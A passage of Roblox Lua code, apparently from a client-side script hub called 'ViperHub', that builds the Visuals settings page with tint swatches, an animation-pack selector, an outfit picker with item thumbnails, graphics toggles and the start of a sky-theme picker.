    end
    setLockUIVisual = mkToggle(visualPage, "Lock UI", function(on) toggleLockUI(on) end)
    setHideButtonsVisual = mkToggle(visualPage, "Hide Button", function(on) toggleHideButtons(on) end)
    if setHideButtonsVisual then setHideButtonsVisual(hideButtonsEnabled) end

    -- Visuals: explicit background color presets (independent of the general UI theme).
    do
        mkSect(visualPage, "Background Colors")
        local colorRow = mkRow(visualPage, 88)
        local tintLabel = mkLabel(colorRow, "Image tint")
        if tintLabel and tintLabel:IsA("TextLabel") then
            tintLabel.Size = UDim2.new(1, -8, 0, 18)
            tintLabel.Position = UDim2.new(0, 8, 0, 0)
            tintLabel.TextXAlignment = Enum.TextXAlignment.Left
        end
        local presets = {
            {"Red", Color3.fromRGB(255, 45, 65)}, {"Blue", Color3.fromRGB(45, 115, 255)},
            {"Green", Color3.fromRGB(45, 220, 110)}, {"Purple", Color3.fromRGB(165, 75, 255)},
            {"Pink", Color3.fromRGB(255, 70, 180)}, {"Cyan", Color3.fromRGB(0, 220, 230)},
            {"Yellow", Color3.fromRGB(255, 210, 35)}, {"White", Color3.fromRGB(245, 245, 255)},
            {"Orange", Color3.fromRGB(255, 125, 25)}, {"Gray", Color3.fromRGB(145, 150, 165)},
        }
        local swatches = Instance.new("Frame", colorRow)
        swatches.Name = "BackgroundColorSwatches"
        swatches.BackgroundTransparency = 1
        swatches.Size = UDim2.new(0, 195, 0, 56)
        swatches.Position = UDim2.new(0, 8, 0, 24)
        swatches.ZIndex = 9
        local grid = Instance.new("UIGridLayout", swatches)
        grid.CellSize = UDim2.fromOffset(34, 25)
        grid.CellPadding = UDim2.fromOffset(4, 3)
        grid.FillDirectionMaxCells = 5
        grid.SortOrder = Enum.SortOrder.LayoutOrder
        for i, entry in ipairs(presets) do
            local btn = Instance.new("TextButton", swatches)
            btn.Name = "Tint_" .. entry[1]
            btn.LayoutOrder = i
            btn.Size = UDim2.fromOffset(34, 25)
            btn.BackgroundColor3 = entry[2]
            btn.BorderSizePixel = 0
            btn.Text = ""
            btn.AutoButtonColor = true
            btn.ZIndex = 10
            btn:SetAttribute("ColorName", entry[1])
            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 3)
            local outline = Instance.new("UIStroke", btn)
            outline.Color = Color3.fromRGB(255, 255, 255)
            outline.Transparency = 0.25
            outline.Thickness = 1
            btn.Activated:Connect(function()
                selectedBackgroundTint = entry[2]
                local bg = main and main:FindFirstChild("BackgroundImage")
                local incoming = main and main:FindFirstChild("BackgroundImageTransition")
                if bg and bg:IsA("ImageLabel") then bg.ImageColor3 = entry[2] end
                if incoming and incoming:IsA("ImageLabel") then incoming.ImageColor3 = entry[2] end
                for _, other in ipairs(swatches:GetChildren()) do
                    if other:IsA("TextButton") then
                        local st = other:FindFirstChildOfClass("UIStroke")
                        if st then st.Thickness = (other == btn) and 2 or 1 end
                    end
                end
            end)
        end
    end

    -- UI Scale and Button Scale live in Settings only.

    mkSect(visualPage, "Character")
    do
        local row = mkRow(visualPage, 42)
        mkLabel(row, "Anim Pack")
        local currentIndex = 1
        for i, entry in ipairs(ANIM_PACK_ORDER) do
            if entry[2] == currentAnimPack then currentIndex = i; break end
        end
        local container = Instance.new("Frame", row)
        container.Size = UDim2.new(0, 160, 1, 0)
        container.Position = UDim2.new(1, -168, 0, 0)
        container.BackgroundTransparency = 1
        container.ZIndex = 8
        local leftBtn = Instance.new("TextButton", container)
        leftBtn.Size = UDim2.new(0, 28, 0, 26)
        leftBtn.Position = UDim2.new(0, 0, 0.5, -13)
        leftBtn.BackgroundColor3 = INP
        leftBtn.BackgroundTransparency = 0.7
        leftBtn.BorderSizePixel = 0
        leftBtn.Text = "<"
        leftBtn.TextColor3 = WHITE
        leftBtn.Font = Enum.Font.GothamBold
        leftBtn.TextSize = 13
        leftBtn.AutoButtonColor = false
        leftBtn.ZIndex = 9
        Instance.new("UICorner", leftBtn).CornerRadius = UDim.new(0, 6)
        animSelectorLabel = Instance.new("TextLabel", container)
        animSelectorLabel.Size = UDim2.new(0, 80, 0, 26)
        animSelectorLabel.Position = UDim2.new(0.5, -40, 0.5, -13)
        animSelectorLabel.BackgroundTransparency = 1
        animSelectorLabel.Text = ANIM_PACK_ORDER[currentIndex][2]
        animSelectorLabel.TextColor3 = WHITE
        animSelectorLabel.Font = Enum.Font.GothamBold
        animSelectorLabel.TextSize = 12
        animSelectorLabel.TextXAlignment = Enum.TextXAlignment.Center
        animSelectorLabel.ZIndex = 9
        local rightBtn = Instance.new("TextButton", container)
        rightBtn.Size = UDim2.new(0, 28, 0, 26)
        rightBtn.Position = UDim2.new(1, -28, 0.5, -13)
        rightBtn.BackgroundColor3 = INP
        rightBtn.BackgroundTransparency = 0.7
        rightBtn.BorderSizePixel = 0
        rightBtn.Text = ">"
        rightBtn.TextColor3 = WHITE
        rightBtn.Font = Enum.Font.GothamBold
        rightBtn.TextSize = 13
        rightBtn.AutoButtonColor = false
        rightBtn.ZIndex = 9
        Instance.new("UICorner", rightBtn).CornerRadius = UDim.new(0, 6)
        local function updateAnimSelector(direction)
            local idx = 1
            for i, entry in ipairs(ANIM_PACK_ORDER) do
                if entry[2] == currentAnimPack then idx = i; break end
            end
            local newIdx = idx + direction
            if newIdx < 1 then newIdx = #ANIM_PACK_ORDER end
            if newIdx > #ANIM_PACK_ORDER then newIdx = 1 end
            local packName = ANIM_PACK_ORDER[newIdx][2]
            if packName == "Off" then stopAnimPack() else startAnimPack(packName) end
        end
        leftBtn.MouseButton1Click:Connect(function() updateAnimSelector(-1) end)
        rightBtn.MouseButton1Click:Connect(function() updateAnimSelector(1) end)
    end
    do
        local row = mkRow(visualPage, 42)
        mkLabel(row, "Outfit")
        local container = Instance.new("Frame", row)
        container.Size = UDim2.new(0, 192, 1, 0)
        container.Position = UDim2.new(1, -200, 0, 0)
        container.BackgroundTransparency = 1
        container.ZIndex = 8
        local leftBtn = Instance.new("TextButton", container)
        leftBtn.Size = UDim2.new(0, 24, 0, 26)
        leftBtn.Position = UDim2.new(0, 0, 0.5, -13)
        leftBtn.BackgroundColor3 = INP
        leftBtn.BackgroundTransparency = 0.7
        leftBtn.BorderSizePixel = 0
        leftBtn.Text = "<"
        leftBtn.TextColor3 = WHITE
        leftBtn.Font = Enum.Font.GothamBold
        leftBtn.TextSize = 13
        leftBtn.AutoButtonColor = false
        leftBtn.ZIndex = 9
        Instance.new("UICorner", leftBtn).CornerRadius = UDim.new(0, 6)
        outfitSelectorLabel = Instance.new("TextLabel", container)
        outfitSelectorLabel.Size = UDim2.new(0, 68, 0, 26)
        outfitSelectorLabel.Position = UDim2.new(0, 26, 0.5, -13)
        outfitSelectorLabel.BackgroundTransparency = 1
        outfitSelectorLabel.Text = OUTFITS[currentOutfitIndex].label
        outfitSelectorLabel.TextColor3 = WHITE
        outfitSelectorLabel.Font = Enum.Font.GothamBold
        outfitSelectorLabel.TextSize = 12
        outfitSelectorLabel.TextXAlignment = Enum.TextXAlignment.Center
        outfitSelectorLabel.ZIndex = 9
        local rightBtn = Instance.new("TextButton", container)
        rightBtn.Size = UDim2.new(0, 24, 0, 26)
        rightBtn.Position = UDim2.new(0, 100, 0.5, -13)
        rightBtn.BackgroundColor3 = INP
        rightBtn.BackgroundTransparency = 0.7
        rightBtn.BorderSizePixel = 0
        rightBtn.Text = ">"
        rightBtn.TextColor3 = WHITE
        rightBtn.Font = Enum.Font.GothamBold
        rightBtn.TextSize = 13
        rightBtn.AutoButtonColor = false
        rightBtn.ZIndex = 9
        Instance.new("UICorner", rightBtn).CornerRadius = UDim.new(0, 6)

        local clickOutfitBtn = Instance.new("TextButton", container)
        clickOutfitBtn.Name = "OutfitPreviewButton"
        clickOutfitBtn.Size = UDim2.new(0, 62, 0, 26)
        clickOutfitBtn.Position = UDim2.new(1, -62, 0.5, -13)
        clickOutfitBtn.BackgroundColor3 = Color3.fromRGB(105, 75, 235)
        clickOutfitBtn.BackgroundTransparency = 0.08
        clickOutfitBtn.BorderSizePixel = 0
        clickOutfitBtn.Text = "Click"
        clickOutfitBtn.TextColor3 = WHITE
        clickOutfitBtn.Font = Enum.Font.GothamBold
        clickOutfitBtn.TextSize = 12
        clickOutfitBtn.AutoButtonColor = true
        clickOutfitBtn.ZIndex = 10
        Instance.new("UICorner", clickOutfitBtn).CornerRadius = UDim.new(0, 7)

        local outfitPickerOverlay = nil
        local outfitPickerClosing = false
        local function openOutfitPicker()
            if outfitPickerOverlay and outfitPickerOverlay.Parent then return end
            if not gui or not gui.Parent then return end
            outfitPickerClosing = false

            local tweenService = game:GetService("TweenService")
            local cameraNow = workspace.CurrentCamera
            local screenSize = cameraNow and cameraNow.ViewportSize or Vector2.new(900, 700)
            local screenWidth = screenSize.X
            -- Use two wider columns so all outfit cards remain easy to see and tap.
            -- On short screens, reduce card height; the canvas still scrolls when needed.
            local columns = 2
            local cardHeight = math.clamp(math.floor((math.min(screenSize.Y, 600) - 145) / 3), 96, 146)

            local overlay = Instance.new("Frame")
            overlay.Name = "OutfitPreviewOverlay"
            overlay.Size = UDim2.fromScale(1, 1)
            overlay.Position = UDim2.fromScale(0, 0)
            overlay.BackgroundTransparency = 1
            overlay.BorderSizePixel = 0
            overlay.ZIndex = 300
            overlay.Parent = gui
            outfitPickerOverlay = overlay

            local dimmer = Instance.new("TextButton")
            dimmer.Name = "Backdrop"
            dimmer.Size = UDim2.fromScale(1, 1)
            dimmer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            dimmer.BackgroundTransparency = 1
            dimmer.BorderSizePixel = 0
            dimmer.Text = ""
            dimmer.AutoButtonColor = false
            dimmer.ZIndex = 300
            dimmer.Parent = overlay

            local panel = Instance.new("Frame")
            panel.Name = "OutfitPreviewPanel"
            panel.AnchorPoint = Vector2.new(0.5, 0.5)
            panel.Position = UDim2.fromScale(0.5, 0.5)
            panel.Size = UDim2.new(0.80, 0, 0.70, 0)
            panel.BackgroundColor3 = Color3.fromRGB(13, 13, 17)
            panel.BackgroundTransparency = 0.04
            panel.BorderSizePixel = 0
            panel.Active = true
            panel.ZIndex = 310
            panel.Parent = overlay
            local sizeLimit = Instance.new("UISizeConstraint")
            sizeLimit.MinSize = Vector2.new(310, 280)
            sizeLimit.MaxSize = Vector2.new(760, 600)
            sizeLimit.Parent = panel
            Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 14)
            local panelStroke = Instance.new("UIStroke", panel)
            panelStroke.Color = Color3.fromRGB(102, 80, 220)
            panelStroke.Transparency = 0.18
            panelStroke.Thickness = 1.5

            local title = Instance.new("TextLabel")
            title.Name = "Title"
            title.Position = UDim2.new(0, 16, 0, 8)
            title.Size = UDim2.new(1, -72, 0, 28)
            title.BackgroundTransparency = 1
            title.Text = "OUTFIT ITEMS"
            title.TextColor3 = WHITE
            title.Font = Enum.Font.GothamBold
            title.TextSize = 17
            title.TextXAlignment = Enum.TextXAlignment.Left
            title.ZIndex = 312
            title.Parent = panel

            local subtitle = Instance.new("TextLabel")
            subtitle.Position = UDim2.new(0, 16, 0, 34)
            subtitle.Size = UDim2.new(1, -32, 0, 18)
            subtitle.BackgroundTransparency = 1
            subtitle.Text = "Aksesuar / ürün görsellerini seç  •  OFF + 5 outfit"
            subtitle.TextColor3 = Color3.fromRGB(165, 165, 178)
            subtitle.Font = Enum.Font.Gotham
            subtitle.TextSize = 11
            subtitle.TextXAlignment = Enum.TextXAlignment.Left
            subtitle.ZIndex = 312
            subtitle.Parent = panel

            local closeBtn = Instance.new("TextButton")
            closeBtn.Name = "Close"
            closeBtn.Size = UDim2.new(0, 30, 0, 30)
            closeBtn.Position = UDim2.new(1, -40, 0, 8)
            closeBtn.BackgroundColor3 = Color3.fromRGB(37, 37, 45)
            closeBtn.BorderSizePixel = 0
            closeBtn.Text = "×"
            closeBtn.TextColor3 = WHITE
            closeBtn.Font = Enum.Font.GothamBold
            closeBtn.TextSize = 21
            closeBtn.ZIndex = 313
            closeBtn.Parent = panel
            Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)

            local cardScroll = Instance.new("ScrollingFrame")
            cardScroll.Name = "OutfitCards"
            cardScroll.Position = UDim2.new(0, 12, 0, 60)
            cardScroll.Size = UDim2.new(1, -24, 1, -96)
            cardScroll.BackgroundTransparency = 1
            cardScroll.BorderSizePixel = 0
            cardScroll.ScrollBarThickness = 4
            cardScroll.ScrollBarImageColor3 = Color3.fromRGB(116, 91, 235)
            cardScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
            cardScroll.ScrollingEnabled = true
            cardScroll.ZIndex = 311
            cardScroll.Parent = panel

            local grid = Instance.new("UIGridLayout")
            grid.SortOrder = Enum.SortOrder.LayoutOrder
            grid.CellSize = UDim2.new(1 / columns, -10, 0, cardHeight)
            grid.CellPadding = UDim2.new(0, 10, 0, 10)
            grid.Parent = cardScroll

            -- Base scrolling height on the grid's actual content, not a guessed row count.
            -- This keeps Outfit 4/5 reachable if the viewport size changes while opening.
            local function updateOutfitCanvasSize()
                if not cardScroll.Parent or not grid.Parent then return end
                cardScroll.CanvasSize = UDim2.new(0, 0, 0, math.ceil(grid.AbsoluteContentSize.Y + 14))
            end
            grid:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateOutfitCanvasSize)
            cardScroll:GetPropertyChangedSignal("AbsoluteSize"):Connect(updateOutfitCanvasSize)
            task.defer(updateOutfitCanvasSize)

            local function closeOutfitPicker()
                if outfitPickerClosing then return end
                outfitPickerClosing = true
                if not overlay.Parent then outfitPickerOverlay = nil; return end
                local fade = tweenService:Create(dimmer, TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency = 1})
                local shrink = tweenService:Create(panel, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Size = UDim2.new(0.78, 0, 0.66, 0), BackgroundTransparency = 1})
                fade:Play()
                shrink:Play()
                shrink.Completed:Connect(function()
                    if overlay and overlay.Parent then overlay:Destroy() end
                    if outfitPickerOverlay == overlay then outfitPickerOverlay = nil end
                    outfitPickerClosing = false
                end)
            end
            dimmer.Activated:Connect(closeOutfitPicker)
            closeBtn.Activated:Connect(closeOutfitPicker)

            -- The picker intentionally uses item thumbnails only; no avatar clone or 3D viewport is created.

            local cards = {}
            local function chooseOutfit(i)
                local outfit = OUTFITS[i]
                if not outfit then return end
                currentOutfitIndex = i
                local applyOK, applyErr = pcall(function()
                    applyOutfitByIndex(currentOutfitIndex)
                end)
                if not applyOK then warn("[ViperHub Outfit] " .. tostring(applyErr)) end
                if outfitSelectorLabel then outfitSelectorLabel.Text = outfit.label end
                for j, entry in ipairs(cards) do
                    local chosen = (j == currentOutfitIndex)
                    entry.card.BackgroundColor3 = chosen and Color3.fromRGB(39, 32, 70) or Color3.fromRGB(24, 24, 30)
                    entry.stroke.Color = chosen and Color3.fromRGB(135, 106, 255) or Color3.fromRGB(57, 57, 68)
                    entry.stroke.Thickness = chosen and 2 or 1
                    entry.badge.Visible = chosen
                end
                saveAllSettings(true)
            end

            for i, outfit in ipairs(OUTFITS) do
                local card = Instance.new("TextButton")
                card.Name = "OutfitCard_" .. tostring(i)
                card.LayoutOrder = i
                card.Text = ""
                card.AutoButtonColor = true
                card.BackgroundColor3 = i == currentOutfitIndex and Color3.fromRGB(39, 32, 70) or Color3.fromRGB(24, 24, 30)
                card.BorderSizePixel = 0
                card.ClipsDescendants = true
                card.ZIndex = 312
                card.Parent = cardScroll
                Instance.new("UICorner", card).CornerRadius = UDim.new(0, 10)
                local stroke = Instance.new("UIStroke", card)
                stroke.Color = i == currentOutfitIndex and Color3.fromRGB(135, 106, 255) or Color3.fromRGB(57, 57, 68)
                stroke.Thickness = i == currentOutfitIndex and 2 or 1
                stroke.Transparency = 0.15

                -- Show the actual outfit item asset thumbnail, not a copy of the player avatar.
                -- Try alternate accessory assets and direct image URLs if the first thumbnail is unavailable.
                local thumbnailIds = {}
                local thumbnailSeen = {}
                local function addThumbnailCandidate(value)
                    local id = nil
                    if type(value) == "number" then
                        id = value
                    elseif value ~= nil then
                        id = tonumber(tostring(value):match("id=(%d+)")) or tonumber(tostring(value):match("(%d+)"))
                    end
                    if id and not thumbnailSeen[id] then
                        thumbnailSeen[id] = true
                        table.insert(thumbnailIds, id)
                    end
                end
                -- Prefer the actual accessory/product thumbnail so the card shows the item itself,
                -- not a shirt/pants asset or a rendered copy of the player's avatar.
                addThumbnailCandidate(outfit.accessory)
                if outfit.customApply and HOMERO_CFG then
                    for _, itemData in ipairs(HOMERO_CFG.items or {}) do
                        addThumbnailCandidate(itemData.id)
                    end
                end
                addThumbnailCandidate(outfit.shirt)
                addThumbnailCandidate(outfit.pants)
                if outfit.customApply and HOMERO_CFG then
                    addThumbnailCandidate(HOMERO_CFG.pants)
                end

                local fallbackImage = Instance.new("ImageLabel")
                fallbackImage.Name = "AssetThumbnailFallback"
                fallbackImage.Position = UDim2.new(0, 5, 0, 5)
                fallbackImage.Size = UDim2.new(1, -10, 1, -42)
                fallbackImage.BackgroundColor3 = Color3.fromRGB(17, 17, 22)
                fallbackImage.BackgroundTransparency = 1
                fallbackImage.BorderSizePixel = 0
                fallbackImage.ScaleType = Enum.ScaleType.Fit
                fallbackImage.ImageTransparency = 0
                fallbackImage.ZIndex = 313
                fallbackImage.Parent = card
                local itemFallback = Instance.new("TextLabel")
                itemFallback.Name = "ItemThumbnailFallback"
                itemFallback.Position = UDim2.new(0, 8, 0, 8)
                itemFallback.Size = UDim2.new(1, -16, 1, -48)
                itemFallback.BackgroundTransparency = 1
                itemFallback.Text = (outfit.label == "OFF") and "CURRENT LOOK" or "Loading item image..."
                itemFallback.TextColor3 = Color3.fromRGB(180, 180, 190)
                itemFallback.Font = Enum.Font.GothamBold
                itemFallback.TextSize = 10
                itemFallback.TextWrapped = true
                itemFallback.ZIndex = 312
                itemFallback.Parent = card
                fallbackImage.Visible = false
                itemFallback.Visible = true
                if #thumbnailIds > 0 then
                    fallbackImage.Image = "rbxthumb://type=Asset&id=" .. tostring(thumbnailIds[1]) .. "&w=420&h=420"
                    fallbackImage.Visible = true
                    task.spawn(function()
                        local contentProvider = game:GetService("ContentProvider")
                        for _, candidateId in ipairs(thumbnailIds) do
                            if not fallbackImage.Parent then return end
                            local urls = {
                                "rbxthumb://type=Asset&id=" .. tostring(candidateId) .. "&w=420&h=420",
                                "rbxassetid://" .. tostring(candidateId),
                            }
                            for _, imageUrl in ipairs(urls) do
                                if not fallbackImage.Parent then return end
                                fallbackImage.Image = imageUrl
                                local fetchStatus = nil
                                local preloadOK = pcall(function()
                                    contentProvider:PreloadAsync({fallbackImage}, function(_, status)
                                        fetchStatus = status
                                    end)
                                end)
                                if preloadOK and fetchStatus == Enum.AssetFetchStatus.Success then
                                    itemFallback.Visible = false
                                    return
                                end
                                task.wait(0.12)
                            end
                        end
                        if fallbackImage.Parent then
                            fallbackImage.Visible = false
                            itemFallback.Text = (outfit.label == "OFF") and "Original character" or "Item preview unavailable"
                            itemFallback.Visible = true
                        end
                    end)
                else
                    fallbackImage.Image = ""
                    itemFallback.Text = (outfit.label == "OFF") and "Original character" or "Item preview unavailable"
                    itemFallback.Visible = true
                end
                Instance.new("UICorner", fallbackImage).CornerRadius = UDim.new(0, 7)

                -- No avatar/3D viewport is created here; each outfit card displays the item's own asset thumbnail.


                local nameLabel = Instance.new("TextLabel")
                nameLabel.Name = "OutfitName"
                nameLabel.Position = UDim2.new(0, 6, 1, -33)
                nameLabel.Size = UDim2.new(1, -12, 0, 25)
                nameLabel.BackgroundTransparency = 1
                nameLabel.Text = outfit.label
                nameLabel.TextColor3 = WHITE
                nameLabel.Font = Enum.Font.GothamBold
                nameLabel.TextSize = 12
                nameLabel.TextTruncate = Enum.TextTruncate.AtEnd
                nameLabel.ZIndex = 314
                nameLabel.Parent = card


                local equippedLabel = Instance.new("TextLabel")
                equippedLabel.Name = "EquippedBadge"
                equippedLabel.AnchorPoint = Vector2.new(1, 0)
                equippedLabel.Position = UDim2.new(1, -8, 0, 8)
                equippedLabel.Size = UDim2.new(0, 56, 0, 18)
                equippedLabel.BackgroundColor3 = Color3.fromRGB(104, 78, 220)
                equippedLabel.BorderSizePixel = 0
                equippedLabel.Text = "SELECTED"
                equippedLabel.TextColor3 = WHITE
                equippedLabel.Font = Enum.Font.GothamBold
                equippedLabel.TextSize = 8
                equippedLabel.Visible = i == currentOutfitIndex
                equippedLabel.ZIndex = 317
                equippedLabel.Parent = card
                Instance.new("UICorner", equippedLabel).CornerRadius = UDim.new(0, 5)

                cards[i] = {card = card, stroke = stroke, badge = equippedLabel}
                card.Activated:Connect(function()
                    chooseOutfit(i)
                end)
                -- Card-level Activated handles mouse and touch; no 3D preview input is needed.
            end

            -- Item thumbnails are loaded directly; avatar/ViewportFrame preview is intentionally disabled.
            task.defer(updateOutfitCanvasSize)

            local finalSize = UDim2.new(0.88, 0, 0.80, 0)
            tweenService:Create(dimmer, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.42}):Play()
            local openTween = tweenService:Create(panel, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = finalSize})
            openTween:Play()
        end

        clickOutfitBtn.Activated:Connect(openOutfitPicker)

        local function updateOutfit(direction)
            local newIdx = currentOutfitIndex + direction
            if newIdx < 1 then newIdx = #OUTFITS end
            if newIdx > #OUTFITS then newIdx = 1 end
            currentOutfitIndex = newIdx
            pcall(function() applyOutfitByIndex(currentOutfitIndex) end)
            if outfitSelectorLabel then outfitSelectorLabel.Text = OUTFITS[currentOutfitIndex].label end
            saveAllSettings()
        end
        leftBtn.MouseButton1Click:Connect(function() updateOutfit(-1) end)
        rightBtn.MouseButton1Click:Connect(function() updateOutfit(1) end)
    end

    mkSect(visualPage, "Effects")
    setVividVisual = mkToggle(visualPage, "Vivid Graphics", function(on)
        toggleVividGraphics(on)
        if setVividVisual then setVividVisual(on) end
    end)
    if setVividVisual then setVividVisual(vividGraphicsEnabled) end
    do
        local row = mkRow(visualPage, 42)
        mkLabel(row, "Stretch Rez")
        local stretchPill, stretchDot = mkPill(row, 48)
        local stretchOn = false
        local function setStretch(s)
            stretchOn = s
            animPill(stretchPill, stretchDot, s)
            if s then enableStretch() else disableStretch() end
            stretchEnabled = s
        end
        local stretchClk = Instance.new("TextButton", stretchPill)
        stretchClk.Size = UDim2.new(1,0,1,0)
        stretchClk.BackgroundTransparency = 1
        stretchClk.Text = ""
        stretchClk.AutoButtonColor = false
        stretchClk.ZIndex = 10
        stretchClk.MouseButton1Click:Connect(function() setStretch(not stretchOn) end)
        _G.stretchToggleSetter = setStretch
    end
    setAntiLagVisual = mkToggle(visualPage, "Anti Lag", function(on)
        if on then enableAntiLag() else disableAntiLag() end
    end)
    do
        local row = mkRow(visualPage, 42)
        mkLabel(row, "Sky Themes")
        local openSkyPicker = Instance.new("TextButton", row)
        openSkyPicker.Name = "OpenSkyThemePicker"
        openSkyPicker.Size = UDim2.new(0, 100, 0, 28)
        openSkyPicker.Position = UDim2.new(1, -110, 0.5, -14)
        openSkyPicker.BackgroundColor3 = Color3.fromRGB(31, 29, 39)
        openSkyPicker.BorderSizePixel = 0
        openSkyPicker.Text = "Click"
        openSkyPicker.TextColor3 = WHITE
        openSkyPicker.Font = Enum.Font.GothamBold
        openSkyPicker.TextSize = 12
        openSkyPicker.AutoButtonColor = false
        openSkyPicker.ZIndex = 9
        Instance.new("UICorner", openSkyPicker).CornerRadius = UDim.new(0, 8)
        local btnStroke = Instance.new("UIStroke", openSkyPicker)
        btnStroke.Color = getThemeColor()
        btnStroke.Thickness = 1.2

        local skyDim = Instance.new("TextButton", gui)
        skyDim.Name = "SkyThemePickerDim"
        skyDim.Size = UDim2.fromScale(1, 1)
        skyDim.Position = UDim2.fromScale(0, 0)
        skyDim.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        skyDim.BackgroundTransparency = 1
        skyDim.BorderSizePixel = 0
        skyDim.Text = ""
        skyDim.TextTransparency = 1
        skyDim.AutoButtonColor = false
        skyDim.Visible = false
        skyDim.ZIndex = 99

        local skyPicker = Instance.new("Frame", gui)
        skyPicker.Name = "SkyThemePicker"
        skyPicker.AnchorPoint = Vector2.new(0.5, 0.5)
        skyPicker.Position = UDim2.fromScale(0.5, 0.5)
        skyPicker.Size = UDim2.new(0, 450, 0, 390)
        skyPicker.BackgroundColor3 = Color3.fromRGB(17, 17, 23)
        skyPicker.BackgroundTransparency = 0.02
        skyPicker.BorderSizePixel = 0
        skyPicker.Visible = false
        skyPicker.ZIndex = 100
        Instance.new("UICorner", skyPicker).CornerRadius = UDim.new(0, 16)
        local ps = Instance.new("UIStroke", skyPicker)
        ps.Color = getThemeColor()
        ps.Thickness = 1.5
        ps.Transparency = 0.08

        local skyPickerScale = Instance.new("UIScale", skyPicker)
        skyPickerScale.Scale = 1
        local skyPickerTransitioning = false
        local function closeSkyPicker()
            if not skyPicker.Visible or skyPickerTransitioning then return end
            skyPickerTransitioning = true
            local panelTween = TS:Create(skyPickerScale, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Scale = 0.9})
            local fadeTween = TS:Create(skyPicker, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency = 1})
            local dimTween = TS:Create(skyDim, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency = 1})
            panelTween.Completed:Connect(function()
                skyPicker.Visible = false
                skyDim.Visible = false
                skyPickerScale.Scale = 1
                skyPicker.BackgroundTransparency = 0.02
                skyPickerTransitioning = false
            end)
            panelTween:Play(); fadeTween:Play(); dimTween:Play()
        end
        local function openSkyPickerAnimated()
            if skyPickerTransitioning or skyPicker.Visible then return end
            skyPickerTransitioning = true
            skyDim.Visible = true
            skyDim.BackgroundTransparency = 1
            skyPicker.Visible = true
            skyPickerScale.Scale = 0.86
            skyPicker.BackgroundTransparency = 1
            TS:Create(skyPickerScale, TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
            TS:Create(skyDim, TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundTransparency = 0.42}):Play()
            local fadeTween = TS:Create(skyPicker, TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundTransparency = 0.02})
            fadeTween.Completed:Connect(function() skyPickerTransitioning = false end)
            fadeTween:Play()
        end
        skyDim.Activated:Connect(closeSkyPicker)

        local title = Instance.new("TextLabel", skyPicker)
        title.BackgroundTransparency = 1
        title.Position = UDim2.new(0, 16, 0, 10)
        title.Size = UDim2.new(1, -60, 0, 26)
        title.Text = "SKY THEMES"
        title.TextColor3 = WHITE
        title.Font = Enum.Font.GothamBold
        title.TextSize = 13
        title.TextXAlignment = Enum.TextXAlignment.Left
        title.ZIndex = 101
        local close = Instance.new("TextButton", skyPicker)
        close.Size = UDim2.new(0, 28, 0, 28)
        close.Position = UDim2.new(1, -38, 0, 9)
        close.BackgroundColor3 = Color3.fromRGB(37, 34, 44)
        close.BorderSizePixel = 0
        close.Text = "×"
        close.TextColor3 = WHITE
        close.Font = Enum.Font.GothamBold
        close.TextSize = 18
        close.ZIndex = 102
        Instance.new("UICorner", close).CornerRadius = UDim.new(0, 8)
        close.Activated:Connect(closeSkyPicker)

        local currentSkyLabel = Instance.new("TextLabel", skyPicker)
        currentSkyLabel.BackgroundTransparency = 1
        currentSkyLabel.Position = UDim2.new(0, 16, 0, 39)
        currentSkyLabel.Size = UDim2.new(1, -32, 0, 20)
        currentSkyLabel.TextColor3 = Color3.fromRGB(190, 190, 204)
        currentSkyLabel.Font = Enum.Font.Gotham
        currentSkyLabel.TextSize = 11
        currentSkyLabel.TextXAlignment = Enum.TextXAlignment.Left
        currentSkyLabel.ZIndex = 101

        local skyScroll = Instance.new("ScrollingFrame", skyPicker)
        skyScroll.Name = "SkyThemeChoices"
        skyScroll.Position = UDim2.new(0, 14, 0, 65)
        skyScroll.Size = UDim2.new(1, -28, 1, -80)
        skyScroll.BackgroundColor3 = Color3.fromRGB(11, 11, 16)
        skyScroll.BackgroundTransparency = 0.12
        skyScroll.BorderSizePixel = 0
        skyScroll.ScrollBarThickness = 4
        skyScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
        skyScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
        skyScroll.ZIndex = 101
        Instance.new("UICorner", skyScroll).CornerRadius = UDim.new(0, 10)
        local pad = Instance.new("UIPadding", skyScroll)
        pad.PaddingTop = UDim.new(0, 8)
        pad.PaddingBottom = UDim.new(0, 8)
        pad.PaddingLeft = UDim.new(0, 8)
        pad.PaddingRight = UDim.new(0, 8)
        local grid = Instance.new("UIGridLayout", skyScroll)
        grid.CellSize = UDim2.new(0, 126, 0, 58)
        grid.CellPadding = UDim2.new(0, 7, 0, 7)
        grid.SortOrder = Enum.SortOrder.LayoutOrder

        local skySwatches = {
            Off=Color3.fromRGB(65,65,75), Night=Color3.fromRGB(25,30,65), Aurora=Color3.fromRGB(40,210,170),
            Sunset=Color3.fromRGB(255,115,65), Galaxy=Color3.fromRGB(95,45,170), Cyber=Color3.fromRGB(0,220,255),
            Sakura=Color3.fromRGB(255,145,195), ["Pink Night"]=Color3.fromRGB(170,70,145),
            ["Blood Moon"]=Color3.fromRGB(175,20,35), ["Emerald Dawn"]=Color3.fromRGB(25,170,100),
            Volcanic=Color3.fromRGB(230,65,20), Arctic=Color3.fromRGB(130,220,255),
            ["Midnight Ocean"]=Color3.fromRGB(15,85,145), Vaporwave=Color3.fromRGB(220,90,255),
